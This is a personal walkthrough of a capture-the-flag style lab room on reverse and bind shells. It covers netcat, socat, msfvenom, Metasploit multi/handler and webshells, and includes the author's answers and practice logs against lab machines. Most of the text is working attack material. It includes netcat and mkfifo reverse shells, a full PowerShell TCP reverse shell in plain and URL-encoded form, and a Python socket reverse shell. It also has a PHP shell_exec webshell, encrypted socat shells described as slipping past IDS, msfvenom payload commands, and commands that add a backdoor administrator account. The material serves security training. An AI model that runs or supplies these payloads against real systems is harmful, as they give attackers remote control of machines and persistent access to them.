# What The Shell

## What Is A Shell?

In the simplest possible terms, shells are what we use when interfacing with a command line environment. Bash and sh are common in Linux, cmd and Powershell are common in Windows. When targeting remote systems it is possible to force an application running on the server to execute arbitrary code.. When this happens we want to capitalise and obtain a shell on the target.

We can force the remote server to either send us command line access to the server (a **reverse** shell), or to open up a port on the server which we can connect to in order to execute further commands (a **bind** shell).

## Tools

There a variety of tools that we can use to receive reverse shells and to send bind shells. To do this we need shell code, as well as a way of interfacing with the resulting shell.

#### Netcat

Netcat is used to perform all kinds of network interactions, including things like banner grabbing during enumeration. It can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are unstable and should be stabilised before doing anything complicated with them.

#### Socat

Socat is like netcat on steroids. It can do all of the same things and many more. They are more stable than netcat shells however the syntax can be complicated, and unlike netcat, it is rarely installed by default on Linux distributions.

Both Socat and Netcat have exe versions available for Windows.

#### Metasploit - multi/handler

The `auxiliary/multi/handler` module of Metasploit is used to receive reverse shells. It provides a simple way to retrieve stable shells and provides many options to further improve the shell. It's the only way to interact with a meterpreter shell and is the easiest way to handle staged payloads.

#### Msfvenom

Msfvenom comes with Metasploit however it is also a standalone tool. It is used to generate payloads.

-------------------------------------------------------------------------------

Aside for the tools covered here, there are also repositories of shells and shellcode in different languages:

* [Payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md "Github")
* [PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet "Web Archive")

## Types Of Shell

At a high level, we are interested in two kinds of shell when it comes to exploiting a target:

* Reverse shells - The target is forced to execute code that connects back to your computer. A tool is used to set up a listener that will retrieve the connection. Reverse shells can be used to bypass firewall rules that prevent you from connecting to certain ports on the target, however when retrieving the shell you may need to configure your own network to retrieve the shell.
* Bind shells - The code executed on the target is used to start a listener attached to a shell directly on the target. This is then opened up to the internet so you can connect to the opened port and obtain remote code execution that way. This may be prevented by firewalls protecting the target.

As a general rule, reverse shells are easier to execute and debug when compared to bind shells.

#### Reverse Shell Example

Most of the time a reverse shell is the goal. A simple netcat reverse shell requires you to run `nc -lnvp <PORT>` on the attacking machine, then continuing by running `nc <YOUR_IP> <PORT> -e /bin/bash` on the target machine.

#### Bind Shell Example

Bind shells are less common, but work similarly to reverse shells. Begin by opening up a listener on the target with `nc -lnvp <PORT> -e "cmd.exe"` and then connect to it from the attacking machine (`nc <TARGET_IP> <PORT>`).

Both of these methods are valid and give us remote code execution

---

Shells can be either interactive or non-interactive

* Interactive - Almost any standard CLI environment is an interactive shell. These allow you to interact with programs after they have been executed. Some programs require an interactive shell to run properly
* Non-interactive - Here you are limited to using programs which do not require user interaction to run properly. The majority of simple reverse and bind shells are non-interactive.

**Questions**

    1. Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?

R

    2. You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)

N

    3. When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?

T

## Netcat

Netcat is a very basic tool when it comes to networking

#### Reverse Shells

The syntax for starting a netcat listener is `nc -lnvp <PORT>`
* -l - tells netcat that this will be a listener
* -v - is used to request a verbose output
* -n - tells netcat not to resolve hostnames or use DNS.
* -p - indicates that the port specification will follow

If a port under 1024 is chosen then netcat will need to be ran with sudo. it is often a good idea to use a well known port number (80,443,53) as these are more likely to get around outbound firewall rules on the target.

#### Bind Shells

In order to connect to a bind shell set up on a target then the syntax to connect is very simple, after setting up a listener on the victim machine, running `nc <TARGET_IP> <PORT>` on the attacker machine will make an outbound connection to the chosen port.

**Questions**

    1. Which option tells netcat to listen?

-l

    2. How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?

nc 10.10.10.11 8080

## Netcat Shell Stabilisation

Upon obtaining a netcat shell notice that it is very unstable. Ctrl+C will kill the whole shell, it's non-interactive, and often has formatting errors. There are many ways to stabilise shells on Linux systems. Stabilisation of Windows reverse shells tends to be more complex.

#### Technique 1: Python

The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
Step two is: `export TERM=xterm `, this will give us access to term commands such as clear.
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

This can be automated using this script [stabilise_shell.sh](https://github.com/JohnHammond/poor-mans-pentest/blob/master/stabilize_shell.sh "Github")

#### Technique 2: rlwrap

rlwrap is a program that gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell, however some manual stabilisation must still be utilised if you want to be able to use CTRL+C inside the shell.

To use rlwrap we use a slightly different listener `rlwrap nc -lvnp PORT`

Prepending with rlwrap gives us a much more fully featured shell. This technique is useful for getting better Windows shells which usually are very difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise by using Ctrl+Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

#### Technique 3: Socat

Use an initial netcat shell as a stepping stone into a more fully-featured socat shell. To accomplish this method of stabilisation first we would compile a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true "Github") up to the target machine. A typical way to achieve this would be using a web-server on the attacking machine inside the directory containing your socat binary `sudo python3 -m http.server 80`, then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget `wget <LOCAL-IP>/socat -O /tmp/socat`.

In powershell the command would be slightly different `Invoke-WebRequest -uri LOCAL-IP/socat.exe -outfile C:\\Windows\temp\socat.exe`

---

With any of the above techniques, it's useful to be able to change you terminal tty size. In another terminal `stty -a` can be ran to findout the current rows and columns for your terminal. In reverse/bind shell this can be achieved through:
* `stty rows NUMBER`
* `stty cols NUMBER`

This will change the registered height and width of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

**Questions**

    1. How would you change your terminal size to have 238 columns?

`stty cols 238`

    2. What is the syntax for setting up a Python3 webserver on port 80?

`sudo python3 -m http.server 80`

## Socat

Socat is similar to netcat in some ways but fundamentally different in many others. The easiest way to think about socat is as a connector between two points.

#### Reverse Shells

`socat TCP-L:<PORT>` - basic syntax for a socat reverse shell

Socat takes in two points (a listening port and standard input) and then connects them together. The shell will be unstable but this will work on both Linux and Windows.

On Windows machines `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` is used to connect back. For a Linux target `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` is the equivalent command.

#### Bind Shells

On a Linux target we would use the following command: `socat TCP-L:<PORT>EXEC:"bash -li"`. On a Windows system the command is `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`. Regardless of the target, this is the command to be used on our attacking machine to connect to the waiting listener `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

---

Socat can also return a fully stable Linux tty reverse shell. This only works when the target is Linux but is significantly more stable. The new listener syntax is ``socat TCP-L:<port> FILE:`tty\`,raw,echo=0``. As usual, we're connecting two points together. In this case those points are a listening port, and a file. This is pretty much equivalent to the netcat method with Ctrl + Z `stty raw -echo; fg`.

The basic listener can be connected to with any payload, however this listener must be activated with a specific socat command in order to get it to work properly. The target must have socat installed so a precompiled binary will need to be uploaded to the target first. 

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane` is ran on the victim machine. The first part of this command links up with the listener on our own machine. Next an interactive bash session is created `EXEC:"bash -li"` passing the following arguments:

* pty, allocates a pseudoterminal on the target - part of the stabilisation process
* stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
* sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
* setsid, creates the process in a new session
* sane, stabilises the terminal, attempting to "normalise" it.

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command. 

**Questions**

    1. How would we get socat to listen on TCP port 8080?

TCP-L:8080

## Socat Encrypted Shells

Socat is capable of creating encrypted bind and reverse shells. They cannot be spied on unless you have the decryption key and are often able to bypass an IDS as a result.

We need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine.

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This command creates a 2048 bit RSA key with matching cert file, self-signed and valid for just under a year. This command will ask for information about the certificate. This can be left blank. The two output files need to be merged into a single `.pem` file.

`cat shell.key shell.crt > shell.pem`

Now when we set up our reverse shell listener we use `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` The certificate must be on the device that is listening. To connect back to the attacking machine we use `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`.

For a bind shell:
* Target - `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
* Attacker - `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

Even for a Windows target the certificate must be used with the listener so the `.pem` file must be transferred over first.

**Questions**

    1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

`socat OPENSSL-LISTEN:53, FILE:tty,raw,echo=0, cert=encrypt.pem, verify=0 -`

    2. If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

`socat OPENSSL:10.10.10.5:53, verify=0, EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

## Common Shell Payloads

In some versions of netcat (including the `nc.exe` Windows version included with Kali at `/usr/share/windows-resources/binaries`, and the version used in Kali itself: `netcat-traditional`) there is a `-e` option which allows you to execute a process on connection. `nc -lvnp <PORT> -e /bin/bash`. Connecting to this listener would result in a bind shell on the target. For a reverse shell `nc <LOCAL-IP> <PORT> -e /bin/bash` on the target would be used.

Most versions of netcat do not include the `-e` argument as it is known to be insecure. On Windows where a static binary is almost always necessary, this technique will work perfectly. On Linux, we will create a listener for a bind shell with 

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`. 

This command first creates a named pipe at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

Using the same method for a netcat reverse shell - `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell. It will look like this.

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

This can be ran in a cmd.exe or powershell.exe shell and executed, resulting in a reverse shell.

**Questions**

    1. What command can be used to create a named pipe in Linux?

mkfifo

## Msfvenom

Part of the metasploit framework, msfvenom is used to generate code for, primarily reverse and bind shells. While being used for lower level exploits such as hexadecimal shellcode for buffer overflow exploits, it can also be used to generate payloads in various formats such as `.exe`, `.aspx`, `.war`, `.py`. The standard syntax for msfvenom is as follows `msfvenom -p <payload> <options>`. As an example, a Windows x64 reverse shell as an exe would be generated with the command `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

* -f (format) - Specifies the output format
* -o (file) - The output location and filename
* LHOST - The IP to connect back to
* LPORT - The port on the local machine to connect back to

---

#### Staged and Stageless Payloads

* Staged payloads are sent in two parts. The first is called the stager. This code is executed on the server itself and connects back to the waiting listener, however it does not contain any reverse shell code by itself. The reverse shell code is downloaded when the stager is activated. Staged payloads require a special listener, usually the metasploit multi/handler.
* Stageless payloads are entirely self contained in that there is one piece of code that when executed will send a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discovery and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by antivirus software.

---

#### Meterpreter

The meterpreter shell is metasploits own brand of fully featured shell. They are also completely stable and contain functionality on their own including file upload and download. To use metasploits port exploitation tools then a meterpreter shell must be used but it is important to note that to use them they must be caught in metasploit. They are also banned in many certification exams.

#### Payload Naming Conventions

The basic naming convention for msfvenom is as follows `<OS>/<arch>/<payload>` or `linux/x86/shell_reverse_tcp`. The exception to this convention is Windows 32bit targets. For these, the arch is not specified `windows/shell_reverse_tcp`

Stageless payloads are denoted by underscores in the name `shell_reverse_tcp` is stageless while `shell/reverse_tcp` is a staged payload which is denoted by the extra forward slash. These rules also apply to meterpreter payloads.

---

Payloads can be searched with `msfvenom --list payloads` and grep can be used to filter for the ones that you would like.

**Questions**

    1. Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o MALWARE_DO_NOT_RUN.exe LHOST=10.9.5.6 LPORT=4444`

    2. Which symbol is used to show that a shell is stageless?

\_

    3. What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell

`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`

## Metasploit multi/handler

Multi/Handler is a superb tool for catching reverse shells.

* Open Metasploit with `msfconsole`
* Type `use multi/handler`, and press enter

By using the `options` command we need to set three arguments:
* payload - `set PAYLOAD <payload>`
* LHOST - `set LHOST <listen-address>`
* LPORT - `set LPORT <listen-port>`

The listener can now be started with `exploit -j` to launch the module, running as a job in the background.

When a staged payload, like the one generated in the previous task is run, Metasploit receives the connection, sends the remainder of the payload and gives us a reverse shell. Because multi/handler was backgrounded the `sessions` command may need to be used to foreground it again.

**Questions**

    1. What command can be used to start a listener in the background?

`exploit -j`

    2. If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?

`sessions 10`

## Webshells

There are times when websites allow us an opportunity to upload an executable file. Ideally we would use the opportunity to upload code that would activate a reverse or bind shell, but this is sometimes not possible. In these cases we can try uploading a webshell.

A webshell is a script that runs inside a webserver, which executes code on the server. Commands are entered into a webpage, either through a HTML form, or directly as arguments in the URL, which are then executed by the script with the results returned and written to the page. The can be used to get around firewalls or as an intermediary step to getting a reverse/bind shell.

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>` This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

Most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.

When the target is Windows it may be best to obtain remote code execution through a webshell, or by using msfvenom to generate a reverse/bind shell in the language of the server. An encoded powershell reverse shell can be used as the cmd argument on Windows targets.

```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
This is the same shell as the powershell shell found in "Common Shell Payloads". It has been URL encoded so that it can be used safely in a get parameter.

## Next Steps

In this task we have discussed lots of ways to generate, send and receive shells. Usually they tend to be unstable and non-interactive.

On a Linux machine we would like to find an opportunity to gain access to a user account. SSH keys are stored at `/home/<user>/.ssh` and are a good way to do this. Additional enumeration may allow you to find credentials somewhere else on the box.


On Windows the options are usually more limited. Passwords for running services can sometimes be found in the registry - VNC servers feequesntly leave passwords here in plaintext. Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in with your preferred method. `net user <username> <password> /add` then `net localgroup administrators <username> /add`

---
Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.

## Practice and Examples

    1. Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.

Uploaded `webshell.php` used the url to enter the netcat callback command ` http://http://10.10.163.76//uploads/webshell.php?cmd=nc%2010.9.5.6%204444%20-e%20%2fbin%2fbash`

    2. Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

Not using Kali. What a stupid question. Downloading pentest monkeys php reverse shell, uploading that then executing it worked fine however...

    3. Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

So once on the machine a reverse shell can be created by connecting back to my tun0 IP. `nc 10.9.5.6 4446 -e /bin/bash`

A bind shell can be set up with `nc -lnvp 4446 -e /bin/bash` and then connect to that from the attacking machine.

    4.Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

In order to create a reverse socat shell, on the attacker machine we set up our listener with `socat tcp-l:5557 -`. Next on the victim machine we run the command `socat tcp:10.9.5.6:5557 EXEC:"bash -li"`

In order to create a socat bind shell, first we set up the listener on the victim machine with `socat tcp-l:5558 EXEC:"bash -li"`. This is then connected to from the attacker machine with `socat tcp:10.10.163.76:5558 -`

    5. Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.

Python example
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.5.6",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

    6. Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?

No 
```
gabriel@gabriel-P65-P67RGRERA:~$ nc -lnvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.155.109 49684
'uname' is not recognized as an internal or external command,
operable program or batch file.
```

    7. Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

Entering this into the URL sent a reverse shell back to my listener
```
http://10.10.155.109/uploads/webshell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.9.5.6%27%2C4446%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

    8. The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.

```
PS C:\xampp\htdocs\uploads> net user gdc abc /add
The command completed successfully.
PS C:\xampp\htdocs\uploads> net localgroup administrators gdc /add
The command completed successfully.
```

Remmina is then used to RDP into the machine

    9. Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

`PS C:\Users\Administrator> nc 10.9.5.6 5555 -e "cmd.exe"` on the victim machine in order to connect back to the listener on my machine.

For a bind shell running `nc -lnvp 5557 -e "cmd.exe"` on the victim machine and connecting with `nc 10.10.155.109 5557` returned a shell.

For a socat reverse shell, after setting up our listener with `socat TCP-L:6666 -` running `socat TCP:10.9.5.6:6666 EXEC:cmd.exe,pipes` on the victim machine returned a shell.

For a socat bind shell set up the listener on the victim machine with `socat TCP-L:7777 EXEC:cmd.exe,pipes` and connect to it with `socat 10.10.155.109:7777 -` on the attacking machine.

    10. Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

* Create payload with `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o malware_for_win.exe LHOST=10.9.5.6 LPORT=8888`
* Open `msfconsole`
* `use multi/handler`
* `set payload windows/x64/meterpreter/reverse_tcp`
* `set LHOST 10.9.5.6`
* set LPORT 8888
* Upload the exe with the website (for some reason nc refused to let me upload)
* Connect to the victim machine and run the executable with `./malware_for_win.exe`
* Meterpreter shell is returned and can be accessed with `sessions 1`a

```
11. Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?
```

staged payload has already been created for Windows - creating a staged payload with `msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe -o nonstagedmalware.exe LHOST=10.9.5.6 LPORT=8889`. Uploading the `.exe` file to the webserver and executing returns a shell in `msfconsole`. None of the shells can be caught in netcat as the payload is a meterpreter shell which can only be used with metasploit.